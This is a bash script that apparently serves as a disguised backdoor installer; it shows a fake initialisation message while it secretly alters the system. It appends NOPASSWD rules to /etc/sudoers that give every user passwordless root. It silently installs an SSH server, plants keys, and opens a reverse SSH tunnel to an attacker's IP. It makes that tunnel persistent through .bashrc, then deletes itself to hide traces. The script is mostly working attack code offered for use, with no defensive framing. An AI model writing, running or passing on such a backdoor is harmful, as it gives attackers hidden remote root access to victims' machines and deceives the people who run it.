#!/bin/bash

# MAKE USR BELIEVE HE'S INITING SOMETHING
echo "Initializing/Inicializando..."

RUTA=$(pwd)

# ------ GRANT PRIVILEGES ------

# MAKE ALL USERS SUPERUSERS AVAILABLE
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# SET SUDO TO NOT ASK FOR SUDOERS PASSWD
echo "%sudo ALL=NOPASSWD: ALL" >> /etc/sudoers

# ------ GO TO HOME, JUST IN CASE ------
cd $HOME
sudo mkdir .ssh > /dev/null 2>&1
cd .ssh/

# ------ TRUSTED RSA ------

PUB_KEY="insert pre-generated RSA public key here"
PRIV_KEY="insert pre-generated RSA private key (obviously associated to the previous public key)"
echo $PUB_KEY > id_rsa.pub
echo $PRIV_KEY > id_rsa

# ------ REVERSE SHELL ------

IP="insert remote addr here (atacker's public IP)"
PORT=6969

# INSTALL OPENSSH-SERVER WITHOUT TELLING USR
yes | sudo apt install openssh-server > /dev/null 2>&1

# MODIFY OPENSSH-SERVER TO LISTEN ON PORT 22
sudo echo "Port 22" >> /etc/ssh/sshd_config

# ENSURE OPENSSH-SERVER ACCESS IS ONLY AVAILABLE TRHOUG PUBLIC KEY AUTH
sudo echo "PasswordAuthentication no" >> /etc/ssh/sshd_config

# CREATE REVERSE SHELL
ssh -fN -R $PORT:localhost:22 $USER@$IP

# ADD THE COMMAND TO BASHRC SO IT EXECUTES EVERYTIME USER LOGS IN
echo "ssh -fN -R 6969:localhost:22 "$USER"@"$IP >> $HOME/.bashrc
echo "clear" >> $HOME/.bashrc

# REMOVE FINGERPRINT
cd $RUTA
echo "sudo rm bananas.sh" >> .end.sh
sudo ./.end.sh
